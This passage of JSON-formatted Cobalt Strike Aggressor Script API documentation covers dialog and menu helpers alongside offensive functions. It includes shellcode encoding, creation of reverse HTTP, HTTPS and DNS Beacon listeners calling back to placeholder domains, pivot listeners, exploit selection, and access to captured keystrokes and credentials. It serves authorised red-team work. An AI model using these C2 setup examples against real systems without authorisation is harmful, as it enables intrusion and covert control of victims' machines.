    "arguments": [
      {
        "param": "$1",
        "desc": "the $dialog object"
      },
      {
        "param": "$2",
        "desc": "the button label"
      }
    ],
    "returns": "",
    "example": "dbutton_action($dialog, \"Start\");\ndbutton_action($dialog, \"Stop\");",
    "notes": "",
    "signature": "dbutton_action",
    "anchors": [
      "dbutton_action"
    ]
  },
  "dbutton_help": {
    "description": "Adds a Help button to a &dialog. When this button is pressed, Cobalt Strike will open the user's browser to the specified URL.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the $dialog object"
      },
      {
        "param": "$2",
        "desc": "the URL to go to"
      }
    ],
    "returns": "",
    "example": "dbutton_help($dialog, \"http://www.google.com\");",
    "notes": "",
    "signature": "dbutton_help",
    "anchors": [
      "dbutton_help"
    ]
  },
  "dialog": {
    "description": "Create a dialog. Use &dialog_show to show it.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the title of the dialog"
      },
      {
        "param": "$2",
        "desc": "a %dictionary mapping row names to default values"
      },
      {
        "param": "$3",
        "desc": "a callback function. Called when the user presses a &dbutton_action button. $1 is a reference to the dialog. $2 is the button name. $3 is a dictionary that maps each row's name to its value."
      }
    ],
    "returns": "A scalar with a $dialog object.",
    "example": "sub callback {\n# prints: Pressed Go, a is: Apple\nprintln(\"Pressed $2 $+ , a is: \" . $3['a']);\n}\n\n$dialog = dialog(\"Hello World\", %(a => \"Apple\", b => \"Bat\"), &callback);\ndrow_text($dialog, \"a\", \"Fruit: \");\ndrow_text($dialog, \"b\", \"Rodent: \");\ndbutton_action($dialog, \"Go\");\ndialog_show($dialog);",
    "notes": "",
    "signature": "dialog",
    "anchors": [
      "dialog"
    ]
  },
  "dialog_description": {
    "description": "Adds a description to a &dialog",
    "arguments": [
      {
        "param": "$1",
        "desc": "a $dialog object"
      },
      {
        "param": "$2",
        "desc": "the description of this dialog"
      },
      {
        "param": "$3",
        "desc": "(optional) the number of lines of text to show for the description of this dialog. When it is not specified two lines of text are shown for the description of this dialog. The maximum number of lines that can be shown is 20."
      }
    ],
    "returns": "",
    "example": "dialog_description($dialog, \"I am the Hello World dialog.\");\n\ndialog_description($dialog, \"I am the Hello World dialog.\", 2);",
    "notes": "",
    "signature": "dialog_description",
    "anchors": [
      "dialog_description"
    ]
  },
  "dialog_show": {
    "description": "Shows a &dialog.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the $dialog object"
      }
    ],
    "returns": "",
    "example": "dialog_show($dialog);",
    "notes": "",
    "signature": "dialog_show",
    "anchors": [
      "dialog_show"
    ]
  },
  "dispatch_event": {
    "description": "Call a function in Java Swing's Event Dispatch Thread. Java's Swing Library is not thread safe. All changes to the user interface should happen from the Event Dispatch Thread.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the function to call"
      }
    ],
    "returns": "",
    "example": "dispatch_event({\nprintln(\"Hello World\"); \n});",
    "notes": "",
    "signature": "dispatch_event",
    "anchors": [
      "dispatch_event"
    ]
  },
  "downloads": {
    "description": "Returns a list of downloads in Cobalt Strike's data model.",
    "arguments": [],
    "returns": "An array of dictionary objects with information about each downloaded file.",
    "example": "printAll(downloads());",
    "notes": "",
    "signature": "downloads",
    "anchors": [
      "downloads"
    ]
  },
  "drow_beacon": {
    "description": "Adds a beacon selection row to a &dialog",
    "arguments": [
      {
        "param": "$1",
        "desc": "a $dialog object"
      },
      {
        "param": "$2",
        "desc": "the name of this row"
      },
      {
        "param": "$3",
        "desc": "the label for this row"
      }
    ],
    "returns": "",
    "example": "drow_beacon($dialog, \"bid\", \"Session: \");",
    "notes": "",
    "signature": "drow_beacon",
    "anchors": [
      "drow_beacon"
    ]
  },
  "drow_checkbox": {
    "description": "Adds a checkbox to a &dialog",
    "arguments": [
      {
        "param": "$1",
        "desc": "a $dialog object"
      },
      {
        "param": "$2",
        "desc": "the name of this row"
      },
      {
        "param": "$3",
        "desc": "the label for this row"
      },
      {
        "param": "$4",
        "desc": "the text next to the checkbox"
      }
    ],
    "returns": "",
    "example": "drow_checkbox($dialog, \"box\", \"Scary: \", \"Check me... if you dare\");",
    "notes": "",
    "signature": "drow_checkbox",
    "anchors": [
      "drow_checkbox"
    ]
  },
  "drow_combobox": {
    "description": "Adds a combobox to a &dialog",
    "arguments": [
      {
        "param": "$1",
        "desc": "a $dialog object"
      },
      {
        "param": "$2",
        "desc": "the name of this row"
      },
      {
        "param": "$3",
        "desc": "the label for this row"
      },
      {
        "param": "$4",
        "desc": "an array of options to choose from"
      }
    ],
    "returns": "",
    "example": "drow_combobox($dialog, \"combo\", \"Options\", @(\"apple\", \"bat\", \"cat\"));",
    "notes": "",
    "signature": "drow_combobox",
    "anchors": [
      "drow_combobox"
    ]
  },
  "drow_exploits": {
    "description": "Adds a privilege escalation exploit selection row to a &dialog",
    "arguments": [
      {
        "param": "$1",
        "desc": "a $dialog object"
      },
      {
        "param": "$2",
        "desc": "the name of this row"
      },
      {
        "param": "$3",
        "desc": "the label for this row"
      }
    ],
    "returns": "",
    "example": "drow_exploits($dialog, \"exploit\", \"Exploit: \");",
    "notes": "",
    "signature": "drow_exploits",
    "anchors": [
      "drow_exploits"
    ]
  },
  "drow_file": {
    "description": "Adds a file chooser row to a &dialog",
    "arguments": [
      {
        "param": "$1",
        "desc": "a $dialog object"
      },
      {
        "param": "$2",
        "desc": "the name of this row"
      },
      {
        "param": "$3",
        "desc": "the label for this row"
      }
    ],
    "returns": "",
    "example": "drow_file($dialog, \"file\", \"Choose: \");",
    "notes": "",
    "signature": "drow_file",
    "anchors": [
      "drow_file"
    ]
  },
  "drow_interface": {
    "description": "Adds a VPN interface selection row to a &dialog",
    "arguments": [
      {
        "param": "$1",
        "desc": "a $dialog object"
      },
      {
        "param": "$2",
        "desc": "the name of this row"
      },
      {
        "param": "$3",
        "desc": "the label for this row"
      }
    ],
    "returns": "",
    "example": "drow_interface($dialog, \"int\", \"Interface: \");",
    "notes": "",
    "signature": "drow_interface",
    "anchors": [
      "drow_interface"
    ]
  },
  "drow_krbtgt": {
    "description": "Adds a krbtgt selection row to a &dialog",
    "arguments": [
      {
        "param": "$1",
        "desc": "a $dialog object"
      },
      {
        "param": "$2",
        "desc": "the name of this row"
      },
      {
        "param": "$3",
        "desc": "the label for this row"
      }
    ],
    "returns": "",
    "example": "drow_krbtgt($dialog, \"hash\", \"krbtgt hash: \");",
    "notes": "",
    "signature": "drow_krbtgt",
    "anchors": [
      "drow_krbtgt"
    ]
  },
  "drow_listener": {
    "description": "Adds a listener selection row to a &dialog. This row only shows listeners with stagers (e.g., windows/beacon_https/reverse_https).",
    "arguments": [
      {
        "param": "$1",
        "desc": "a $dialog object"
      },
      {
        "param": "$2",
        "desc": "the name of this row"
      },
      {
        "param": "$3",
        "desc": "the label for this row"
      }
    ],
    "returns": "",
    "example": "drow_listener($dialog, \"listener\", \"Listener: \");",
    "notes": "",
    "signature": "drow_listener",
    "anchors": [
      "drow_listener"
    ]
  },
  "drow_listener_smb": {
    "description": "DEPRECATED This function is deprecated in Cobalt Strike 4.0. It's now equivalent to &drow_listener_stage",
    "arguments": [],
    "returns": "",
    "example": "",
    "notes": "",
    "signature": "drow_listener_smb",
    "anchors": [
      "drow_listener_smb"
    ]
  },
  "drow_listener_stage": {
    "description": "Adds a listener selection row to a &dialog. This row shows all Beacon and Foreign listener payloads.",
    "arguments": [
      {
        "param": "$1",
        "desc": "a $dialog object"
      },
      {
        "param": "$2",
        "desc": "the name of this row"
      },
      {
        "param": "$3",
        "desc": "the label for this row"
      }
    ],
    "returns": "",
    "example": "drow_listener_stage($dialog, \"listener\", \"Stage: \");",
    "notes": "",
    "signature": "drow_listener_stage",
    "anchors": [
      "drow_listener_stage"
    ]
  },
  "drow_mailserver": {
    "description": "Adds a mail server field to a &dialog.",
    "arguments": [
      {
        "param": "$1",
        "desc": "a $dialog object"
      },
      {
        "param": "$2",
        "desc": "the name of this row"
      },
      {
        "param": "$3",
        "desc": "the label for this row"
      }
    ],
    "returns": "",
    "example": "drow_mailserver($dialog, \"mail\", \"SMTP Server: \");",
    "notes": "",
    "signature": "drow_mailserver",
    "anchors": [
      "drow_mailserver"
    ]
  },
  "drow_proxyserver": {
    "description": "DEPRECATED This function is deprecated in Cobalt Strike 4.0. The proxy configuration is now tied directly to the listener.\n\nAdds a proxy server field to a &dialog.",
    "arguments": [
      {
        "param": "$1",
        "desc": "a $dialog object"
      },
      {
        "param": "$2",
        "desc": "the name of this row"
      },
      {
        "param": "$3",
        "desc": "the label for this row"
      }
    ],
    "returns": "",
    "example": "drow_proxyserver($dialog, \"proxy\", \"Proxy: \");",
    "notes": "",
    "signature": "drow_proxyserver",
    "anchors": [
      "drow_proxyserver"
    ]
  },
  "drow_site": {
    "description": "Adds a site/URL field to a &dialog.",
    "arguments": [
      {
        "param": "$1",
        "desc": "a $dialog object"
      },
      {
        "param": "$2",
        "desc": "the name of this row"
      },
      {
        "param": "$3",
        "desc": "the label for this row"
      }
    ],
    "returns": "",
    "example": "drow_site($dialog, \"url\", \"Site: \");",
    "notes": "",
    "signature": "drow_site",
    "anchors": [
      "drow_site"
    ]
  },
  "drow_text": {
    "description": "Adds a text field row to a &dialog",
    "arguments": [
      {
        "param": "$1",
        "desc": "a $dialog object"
      },
      {
        "param": "$2",
        "desc": "the name of this row"
      },
      {
        "param": "$3",
        "desc": "the label for this row"
      },
      {
        "param": "$4",
        "desc": "(optional) The width of this text field (in characters). This value isn't always honored (it won't shrink the field, but it will make it wider)."
      }
    ],
    "returns": "",
    "example": "drow_text($dialog, \"name\", \"Name: \");",
    "notes": "",
    "signature": "drow_text",
    "anchors": [
      "drow_text"
    ]
  },
  "drow_text_big": {
    "description": "Adds a multi-line text field to a &dialog",
    "arguments": [
      {
        "param": "$1",
        "desc": "a $dialog object"
      },
      {
        "param": "$2",
        "desc": "the name of this row"
      },
      {
        "param": "$3",
        "desc": "the label for this row"
      }
    ],
    "returns": "",
    "example": "drow_text_big($dialog, \"addr\", \"Address: \");",
    "notes": "",
    "signature": "drow_text_big",
    "anchors": [
      "drow_text_big"
    ]
  },
  "dstamp": {
    "description": "Format a time into a date/time value. This value includes seconds.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the time [milliseconds since the UNIX epoch]"
      }
    ],
    "returns": "",
    "example": "println(\"The time is now: \" . dstamp(ticks()));\n\nSee also\n\n&tstamp",
    "notes": "",
    "signature": "dstamp",
    "anchors": [
      "dstamp"
    ]
  },
  "elog": {
    "description": "Publish a notification to the event log",
    "arguments": [
      {
        "param": "$1",
        "desc": "the message"
      }
    ],
    "returns": "",
    "example": "elog(\"The robot invasion has begun!\");",
    "notes": "",
    "signature": "elog",
    "anchors": [
      "elog"
    ]
  },
  "encode": {
    "description": "Obfuscate a position-independent blob of code with an encoder.",
    "arguments": [
      {
        "param": "$1",
        "desc": "position independent code (e.g., shellcode, \"raw\" stageless Beacon) to apply encoder to"
      },
      {
        "param": "$2",
        "desc": "the encoder to use"
      },
      {
        "param": "$3",
        "desc": "the architecture (e.g., x86, x64)"
      }
    ],
    "returns": "A position-independent blob that decodes the original string and passes execution to it.",
    "example": "# generate shellcode for a listener\n$stager = shellcode(\"my-listener\", false \"x86\");\n\n# encode it.\n$stager = encode($stager, \"xor\", \"x86\");",
    "notes": "- The encoded position-independent blob must run from a memory page that has RWX permissions or the decode step will crash the current process.\n\n- alpha encoder: The EDI register must contain the address of the encoded blob. &encode prepends a 10-byte (non-alphanumeric) program to the beginning of the alphanumeric encoded blob. This program calculates the location of the encoded blob and sets EDI for you. If you plan to set EDI yourself, you may remove these first 10 bytes.",
    "signature": "encode",
    "anchors": [
      "encode"
    ]
  },
  "extract_reflective_loader": {
    "description": "DEPRECATED This hook is no longer needed as the stomp loader style reflective loader is no longer supported.\n\nExtract the executable code for a reflective loader from a Beacon Object File (BOF).",
    "arguments": [
      {
        "param": "$1",
        "desc": "Beacon Object File data that contains a reflective loader."
      }
    ],
    "returns": "The Reflective Loader binary executable code extracted from the Beacon Object File data.",
    "example": "See BEACON_RDLL_GENERATE hook\n\n# ---------------------------------------------------------------------\n# extract loader from BOF.\n# ---------------------------------------------------------------------\n$loader = extract_reflective_loader($data);",
    "notes": "",
    "signature": "extract_reflective_loader",
    "anchors": [
      "extract_reflective_loader"
    ]
  },
  "file_browser": {
    "description": "Open the File Browser. This function does not have any parameters.",
    "arguments": [],
    "returns": "",
    "example": "",
    "notes": "",
    "signature": "file_browser",
    "anchors": [
      "file_browser"
    ]
  },
  "fireAlias": {
    "description": "Runs a user-defined alias",
    "arguments": [
      {
        "param": "$1",
        "desc": "the beacon id to run the alias against"
      },
      {
        "param": "$2",
        "desc": "the alias name to run"
      },
      {
        "param": "$3",
        "desc": "the arguments to pass to the alias."
      }
    ],
    "returns": "",
    "example": "# run the foo alias when a new Beacon comes in\non beacon_initial {\nfireAlias($1, \"foo\", \"bar!\");\n}",
    "notes": "",
    "signature": "fireAlias",
    "anchors": [
      "fireAlias"
    ]
  },
  "fireEvent": {
    "description": "Fire an event.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the event name"
      }
    ],
    "returns": "",
    "example": "on foo {\nprintln(\"Argument is: $1\");\n}\n\nfireEvent(\"foo\", \"Hello World!\");",
    "notes": "",
    "signature": "fireEvent",
    "anchors": [
      "fireEvent"
    ]
  },
  "format_size": {
    "description": "Formats a number into a size (e.g., 1024 => 1kb)",
    "arguments": [
      {
        "param": "$1",
        "desc": "the size to format"
      }
    ],
    "returns": "A string representing a human readable data size.",
    "example": "println(format_size(1024));",
    "notes": "",
    "signature": "format_size",
    "anchors": [
      "format_size"
    ]
  },
  "getAggressorClient": {
    "description": "Returns the aggressor.AggressorClient Java object. This can reach anything internal within the current Cobalt Strike client context.",
    "arguments": [],
    "returns": "",
    "example": "$client = getAggressorClient();",
    "notes": "",
    "signature": "getAggressorClient",
    "anchors": [
      "getAggressorClient"
    ]
  },
  "getAggressorClientType": {
    "description": "Returns the type of client that is executing the current script. This function is useful when sharing a script between different client types but you want to limit some capabilities in the script to a particular client type. For example, UI elements should only be executed for the ui client type.",
    "arguments": [],
    "returns": "One of the following strings will be returned:\n\nui - Returned when the Cobalt Strike UI client is executing the script.\n\nheadless - Returned when the Headless Cobalt Strike client is executing the script.\n\nrestapi - Returned when the Cobalt Strike Rest API service is executing the script.\n\nExamples\n\nPrint the aggressor client type that is executing this code.\n\nprintln(\"The aggressor client type is set to: \" . getAggressorClientType());\n\nUse in a CNA script to help control behavior when it is executed by any of the client types.\n\n# Use in a CNA script that may be used by any of the client types.\nif (getAggressorClientType() eq \"ui\") {\nshow_message(\"I am a UI client, safe to show dialog boxes.\");\n} else {\nprintln(\"I am not a UI client, print message to stdout.\");\n}",
    "example": "",
    "notes": "",
    "signature": "getAggressorClientType",
    "anchors": [
      "getAggressorClientType"
    ]
  },
  "getpostexkit": {
    "description": "Returns the id constant for the PostEx kit message type.\n\nSee also\n\n&beacon_execute_postex_job\n\nPostex Kit",
    "arguments": [],
    "returns": "",
    "example": "",
    "notes": "",
    "signature": "get_postex_kit_callback_id",
    "anchors": [
      "getpostexkit"
    ]
  },
  "gunzip": {
    "description": "Decompress a string (GZIP).",
    "arguments": [
      {
        "param": "$1",
        "desc": "the string to compress"
      }
    ],
    "returns": "The argument processed by the gzip de-compressor",
    "example": "println(gunzip(gzip(\"this is a test\")));\n\nSee also\n\n&gzip",
    "notes": "",
    "signature": "gunzip",
    "anchors": [
      "gunzip"
    ]
  },
  "gzip": {
    "description": "GZIP a string.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the string to compress"
      }
    ],
    "returns": "The argument processed by the gzip compressor",
    "example": "println(gzip(\"this is a test\"));\n\nSee also\n\n&gunzip",
    "notes": "",
    "signature": "gzip",
    "anchors": [
      "gzip"
    ]
  },
  "highlight": {
    "description": "Insert an accent (color highlight) into Cobalt Strike's data model",
    "arguments": [
      {
        "param": "$1",
        "desc": "the data model"
      },
      {
        "param": "$2",
        "desc": "an array of rows to highlight"
      },
      {
        "param": "$3",
        "desc": "the accent type"
      }
    ],
    "returns": "",
    "example": "command admincreds {\nlocal('@creds');\n\n# find all of our creds that are user Administrator.\nforeach $entry (credentials()) {\nif ($entry['user'] eq \"Administrator\") {\npush(@creds, $entry);\n}\n}\n\n# highlight all of them green!\nhighlight(\"credentials\", @creds, \"good\");\n}",
    "notes": "- Data model rows include: applications, beacons, credentials, listeners, services, and targets.\n\n- Accent options are:\n\nAccent\nColor\n\n[empty]\nno highlight\n\ngood\nGreen\n\nbad\nRed\n\nneutral\nYellow\n\nignore\nGrey\n\ncancel\nDark Blue",
    "signature": "highlight",
    "anchors": [
      "highlight"
    ]
  },
  "host_delete": {
    "description": "Delete a host from the targets model",
    "arguments": [
      {
        "param": "$1",
        "desc": "the IPv4 or IPv6 address of this target [you may specify an array of hosts too]"
      }
    ],
    "returns": "",
    "example": "# clear all hosts\nhost_delete(hosts());",
    "notes": "",
    "signature": "host_delete",
    "anchors": [
      "host_delete"
    ]
  },
  "host_info": {
    "description": "Get information about a target.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the host IPv4 or IPv6 address"
      },
      {
        "param": "$2",
        "desc": "[Optional] the key to extract a value for"
      }
    ],
    "returns": "%info = host_info(\"address\");\n\nReturns a dictionary with known information about this target.\n\n$value = host_info(\"address\", \"key\");\n\nReturns the value for the specified key from this target's entry in the data model.",
    "example": "# create a script console alias to dump host info\ncommand host {\nprintln(\"Host $1\");\nforeach $key => $value (host_info($1)) {\nprintln(\"$[15]key $value\");\n}\n}",
    "notes": "",
    "signature": "host_info",
    "anchors": [
      "host_info"
    ]
  },
  "host_update": {
    "description": "Add or update a host in the targets model",
    "arguments": [
      {
        "param": "$1",
        "desc": "the IPv4 or IPv6 address of this target [you may specify an array of hosts too]"
      },
      {
        "param": "$2",
        "desc": "the DNS name of this target"
      },
      {
        "param": "$3",
        "desc": "the target's operating system"
      },
      {
        "param": "$4",
        "desc": "the operating system version number (e.g., 10.0)"
      },
      {
        "param": "$5",
        "desc": "a note for the target."
      }
    ],
    "returns": "",
    "example": "host_update(\"192.168.20.3\", \"DC\", \"Windows\", 10.0);",
    "notes": "You may specify a $null value for any argument and, if the host exists, no change will be made to that value.",
    "signature": "host_update",
    "anchors": [
      "host_update"
    ]
  },
  "hosts": {
    "description": "Returns a list of IP addresses from Cobalt Strike's target model",
    "arguments": [],
    "returns": "An array of IP addresses",
    "example": "printAll(hosts());",
    "notes": "",
    "signature": "hosts",
    "anchors": [
      "hosts"
    ]
  },
  "insert_color_menu": {
    "description": "Add a color selection menu to a menu tree",
    "arguments": [
      {
        "param": "$1",
        "desc": "the color menu component to add"
      }
    ],
    "returns": "",
    "example": "popup targets {\nmenu \"&Color\" {\ninsert_color_menu(colorMenu(\"targets\", $1));\n}\n}\n\nSee also\n\n&highlight",
    "notes": "",
    "signature": "insert_color_menu",
    "anchors": [
      "insert_color_menu"
    ]
  },
  "insert_component": {
    "description": "Add a javax.swing.JComponent object to the menu tree",
    "arguments": [
      {
        "param": "$1",
        "desc": "the component to add"
      }
    ],
    "returns": "",
    "example": "",
    "notes": "",
    "signature": "insert_component",
    "anchors": [
      "insert_component"
    ]
  },
  "insert_menu": {
    "description": "Bring menus associated with a popup hook into the current menu tree.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the popup hook"
      }
    ],
    "returns": "",
    "example": "popup beacon {\n# menu definitions above this point\n\ninsert_menu(\"beacon_bottom\", $1);\n\n# menu definitions below this point\n}",
    "notes": "",
    "signature": "insert_menu",
    "anchors": [
      "insert_menu"
    ]
  },
  "iprange": {
    "description": "Generate an array of IPv4 addresses based on a string description",
    "arguments": [
      {
        "param": "$1",
        "desc": "a string with a description of IPv4 ranges"
      }
    ],
    "returns": "An array of IPv4 addresses within the specified ranges.",
    "example": "printAll(iprange(\"192.168.1.0/25\"));",
    "notes": "",
    "signature": "iprange",
    "anchors": [
      "iprange"
    ]
  },
  "keystrokes": {
    "description": "Returns a list of keystrokes from Cobalt Strike's data model.",
    "arguments": [],
    "returns": "An array of dictionary objects with information about recorded keystrokes.",
    "example": "printAll(keystrokes());",
    "notes": "",
    "signature": "keystrokes",
    "anchors": [
      "keystrokes"
    ]
  },
  "killdate": {
    "description": "Get the Beacon kill date configured on the teamserver.",
    "arguments": [],
    "returns": "A string with the teamserver's kill date in the format “YYYY-MM-DD” (where \n\nYYYY is year, \nMM is month and \nDD is the day).\n\nFor example, a returned value of 2024-07-05 is the date 5 July 2024.\n\nNOTE: \n\nA kill date is optional. If a teamserver does not have a kill date set then an empty string is returned.",
    "example": "println(\"Kill date: \" . killdate());",
    "notes": "",
    "signature": "killdate",
    "anchors": [
      "killdate"
    ]
  },
  "listener_create": {
    "description": "DEPRECATED This function is deprecated in Cobalt Strike 4.0. Use &listener_create_ext\n\nCreate a new listener.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the listener name. Valid characters are alphabetic (a-z and A-Z), numeric (0-9), dash (-), period (.), and underscore (_). The name cannot start or end with a period (.)."
      },
      {
        "param": "$2",
        "desc": "the payload (e.g., windows/beacon_http/reverse_http)"
      },
      {
        "param": "$3",
        "desc": "the listener host"
      },
      {
        "param": "$4",
        "desc": "the listener port"
      },
      {
        "param": "$5",
        "desc": "a comma separated list of addresses for listener to beacon to"
      }
    ],
    "returns": "",
    "example": "# create a foreign listener\nlistener_create(\"My-Metasploit\", \"windows/foreign_https/reverse_https\", \n\"ads.losenolove.com\", 443);\n\n# create an HTTP Beacon listener\nlistener_create(\"Beacon-HTTP\", \"windows/beacon_http/reverse_http\",\n\"www.losenolove.com\", 80, \n\"www.losenolove.com, www2.losenolove.com\");",
    "notes": "",
    "signature": "listener_create",
    "anchors": [
      "listener_create"
    ]
  },
  "listener_create_ext": {
    "description": "Create a new listener.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the listener name. Valid characters are alphabetic (a-z and A-Z), numeric (0-9), dash (-), period (.), and underscore (_). The name cannot start or end with a period (.)."
      },
      {
        "param": "$2",
        "desc": "the payload (e.g., windows/beacon_http/reverse_http)"
      },
      {
        "param": "$3",
        "desc": "a map with key/value pairs that specify options for the listener"
      }
    ],
    "returns": "",
    "example": "# Create a simple HTTP listener, with guardrails\nlistener_create_ext(\"Beacon-HTTP\", \"windows/beacon_http/reverse_http\",\n%(host => \"www.losenolove.com\", port => 80,\nbeacons => www.losenolove.com,www2.losenolove.com,\nguards => \"198.178.*.*\\tfoo*\\t*bar\\t*love.com\"));\n\n# Create a detailed HTTPS listener\nlistener_create_ext(\"Beacon-HTTPS\", \"windows/beacon_https/reverse_https\",\n%(host => \"stage.host\", port => 443,\nbeacons => \"b1.host,b2.host\",\nalthost => \"alt.host\",\nbindto => 8443,\nprofile => \"default\",\nstrategy => \"failover-5x\",\nmaxretry => \"exit-10-5-5m\",\nproxy => \"proxy.host\"));\n\n# Create a DNS listener\nlistener_create_ext(\"Beacon-DNS\", \"windows/beacon_dns/reverse_dns_txt\",\n%(host => \"freestuff.com\", port => 53,\nbeacons => \"freestuff.com,freepics.com,freemov.com\",\nbindto => 853,\nprofile => \"default\",\nstrategy => \"failover-5x\",\nmaxretry => \"exit-10-5-5m\"));\n\n# Create a SMB listener\nlistener_create_ext(\"Beacon-SMB\", \"windows/beacon_bind_pipe\",\n%(port => \"mypipe\",\nprofile => \"\"));\n\n# Create a TCP listener for localhost only\nlistener_create_ext(\"Beacon-TCP-Local\", \"windows/beacon_bind_tcp\",\n%(beacons => \"127.0.0.1\", port => 12345,\nlocalonly => \"true\",\nprofile => \"\"));\n\n# Create a TCP listener for external hosts\nlistener_create_ext(\"Beacon-TCP\", \"windows/beacon_bind_tcp\",\n%(beacons => \"0.0.0.0\", port => 54321,\nlocalonly => \"false\",\nprofile => \"\"));\n\n# Create an External C2 listener for localhost only\nlistener_create_ext(\"Beacon-ExtC2-Local\", \"windows/beacon_extc2\",\n%(beacons => \"127.0.0.1\", port => 3333,\nlocalonly => \"true\",\nprofile => \"\"));\n\n# Create an External C2 listener for external hosts\nlistener_create_ext(\"Beacon-ExtC2\", \"windows/beacon_extc2\",\n%(beacons => \"0.0.0.0\", port => 4444,\nlocalonly => \"false\",\nprofile => \"\"));\n\n# Create a Foreign HTTP listener\nlistener_create_ext(\"Metasploit-HTTP\", \"windows/foreign/reverse_http\",\n%(host => \"ads.losenolove.com\", port => 80,\nprofile => \"\"));\n\n# Create a Foreign HTTPS listener\nlistener_create_ext(\"Metasploit-HTTPS\", \"windows/foreign/reverse_https\",\n%(host => \"ads.losenolove.com\", port => 443,\nprofile => \"\"));",
    "notes": "The guards value uses positional tab delimited syntax (\\t) to specify the IP Address, User Name, Server Name, and Domain guardrail settings. For example, if you want to only set the User Name and Server Name settings use the following key/value pair guards:\n\n=> “\\tfoo*\\t*bar” \n\nIn this case the first \\t character sets the IP Address to nothing, foo*\\t sets the User Name, *bar sets the Server Name, and since this is the end of the string the Domain is set to nothing. See the Example section for an example that sets all guardrail settings.\n\nThe localonly value sets how the TCP or External C2 listener port binds to the host. When this setting is set to true then the beacons value needs to be set to 127.0.0.1. If the value is set to false then the beacons value needs to be set to 0.0.0.0.\n\nThe maxretry value uses the following syntax of exit-[max_attempts]-[increase_attempts]-[duration][m,h,d]. For example, exit-10-5-5m will exit beacon after 10 failed attempts and will increase sleep time after 5 failed attempts to 5 minutes. The sleep time will not be updated if the current sleep time is greater than the specified duration value. The sleep time will be affected by the current jitter value. On a successful connection the failed attempts count will be reset to zero and the sleep time will be reset to the prior value.\n\nThe proxy configuration string is the same string you would input into Cobalt Strike's listener dialog. *direct* ignores the local proxy configuration and attempts a direct connection. protocol://user:[email protected]:port specifies which proxy configuration the artifact should use. The username and password are optional (e.g., protocol://host:port is fine). The acceptable protocols are socks and http. Set the proxy configuration string to $null or \"\" to use the default behavior.",
    "signature": "listener_create_ext",
    "anchors": [
      "listener_create_ext"
    ]
  },
  "listener_delete": {
    "description": "Stop and remove a listener that is hosted on the active team server.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the listener name"
      }
    ],
    "returns": "",
    "example": "listener_delete(\"Beacon-HTTP\");",
    "notes": "",
    "signature": "listener_delete",
    "anchors": [
      "listener_delete"
    ]
  },
  "listener_describe": {
    "description": "Describe a listener.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the listener name"
      },
      {
        "param": "$2",
        "desc": "(optional) the remote target the listener is destined for"
      }
    ],
    "returns": "A string describing the listener",
    "example": "foreach $name (listeners()) {\nprintln(\"$name is: \" . listener_describe($name));\n}",
    "notes": "",
    "signature": "listener_describe",
    "anchors": [
      "listener_describe"
    ]
  },
  "listener_info": {
    "description": "Get information about a listener.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the listener name"
      },
      {
        "param": "$2",
        "desc": "(optional) the key to extract a value for"
      }
    ],
    "returns": "%info = listener_info(\"listener-name\");\n\nReturns a dictionary with the metadata for this listener.\n\n$value = listener_info(\"listener-name\", \"key\");\n\nReturns the value for the specified key from this listener's metadata",
    "example": "# create a script console alias to dump listener info\ncommand dump {\nprintln(\"Listener $1\");\nforeach $key => $value (listener_info($1)) {\nprintln(\"$[15]key $value\");\n}\n}",
    "notes": "",
    "signature": "listener_info",
    "anchors": [
      "listener_info"
    ]
  },
  "listener_pivot_create": {
    "description": "Create a new pivot listener.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the Beacon ID"
      },
      {
        "param": "$2",
        "desc": "the listener name. Valid characters are alphabetic (a-z and A-Z), numeric (0-9), dash (-), period (.), and underscore (_). The name cannot start or end with a period (.)."
      },
      {
        "param": "$3",
        "desc": "the payload (e.g., windows/beacon_reverse_tcp)"
      },
      {
        "param": "$4",
        "desc": "the listener host"
      },
      {
        "param": "$5",
        "desc": "the listener port"
      }
    ],
    "returns": "",
    "example": "# create a pivot listener: \n# $1 = beaconID, $2 = name, $3 = port\nalias plisten {\nlocal('$lhost $bid $name $port');\n\n# extract our arguments\n($bid, $name, $port) = @_;\n\n# get the name of our target\n$lhost = beacon_info($1, \"computer\");\n\nbtask($1, \"create TCP listener on $lhost $+ : $+ $port\");\nlistener_pivot_create($1, $name, \"windows/beacon_reverse_tcp\", $lhost, $port);\n}",
    "notes": "The only valid payload argument is windows/beacon_reverse_tcp.",
    "signature": "listener_pivot_create",
    "anchors": [
      "listener_pivot_create"
    ]
  },
  "listener_restart": {
    "description": "Restart a listener that is hosted on the active team server.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the listener name"
      }
    ],
    "returns": "",
    "example": "listener_restart(\"Beacon-HTTP\");",
    "notes": "",
    "signature": "listener_restart",
    "anchors": [
      "listener_restart"
    ]
  },
  "listeners": {
    "description": "Return a list of listener names (with stagers only!) across all team servers this client is connected to.",
    "arguments": [],
    "returns": "An array of listener names.",
    "example": "printAll(listeners());",
    "notes": "",
    "signature": "listeners",
    "anchors": [
      "listeners"
    ]
  },
  "listeners_local": {
    "description": "Return a list of listener names. This function limits itself to the active team server only. External C2 listener names are omitted.",
    "arguments": [],
    "returns": "An array of listener names.",
    "example": "printAll(listeners_local());",
    "notes": "",
    "signature": "listeners_local",
    "anchors": [
      "listeners_local"
    ]
  },
  "listeners_stageless": {
    "description": "Return a list of listener names across all team servers this client is connected to. SMB and TCP listeners are filtered except for those hosted on the active team server. External C2 listeners are filtered as they are not actionable via staging or exporting as a Reflective DLL.",
    "arguments": [],
    "returns": "An array of listener names.",
    "example": "printAll(listeners_stageless());",
    "notes": "",
    "signature": "listeners_stageless",
    "anchors": [
      "listeners_stageless"
    ]
  },
  "localip": {
    "description": "Get the IP address associated with the team server.",
    "arguments": [],
    "returns": "A string with the team server's IP address.",
    "example": "println(\"I am: \" . localip());",
    "notes": "",
    "signature": "localip",
    "anchors": [
      "localip"
    ]
  },
  "menubar": {
